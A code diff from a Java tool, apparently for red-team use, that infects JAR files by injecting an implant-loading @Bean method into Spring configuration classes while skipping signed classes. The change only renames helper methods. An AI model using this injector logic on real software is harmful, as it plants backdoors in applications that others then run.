@@ -27,12 +27,12 @@ public class SpringInjector {
         try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
             for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                 if (!entry.getName().endsWith(".class")) {
-                    entry.passOn();
+                    entry.forward();
                     continue;
                 }
                 if (entry.getEntry().getCodeSigners() != null) {
                     foundSignedClasses = true;
-                    entry.passOn();
+                    entry.forward();
                     continue;
                 }
 
@@ -40,7 +40,7 @@ public class SpringInjector {
                 try (DataInputStream in = new DataInputStream(entry.getContent())) {
                     currentlyProcessing = new ClassFile(in);
                     if (!isSpringConfigurationClass(currentlyProcessing)) {
-                        entry.passOn();
+                        entry.forward();
                         continue;
                     }
                     System.out.println("[+] Found Spring configuration: " + entry.getName());
@@ -68,14 +68,14 @@ public class SpringInjector {
 
                         if (!addBeanToSpringConfig(currentlyProcessing, implantComponent)) {
                             System.out.println("[-] Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
-                            entry.passOn();
+                            entry.forward();
                             continue;
                         }
 
-                        currentlyProcessing.write(entry.addAndGetStream());
+                        currentlyProcessing.write(entry.replaceAndGetStream());
                         System.out.println("[+] Injected @Bean method into '" + currentlyProcessing.getName() + "'.");
                     } else {
-                        entry.passOn();
+                        entry.forward();
                     }
 
                     didInfect = true;
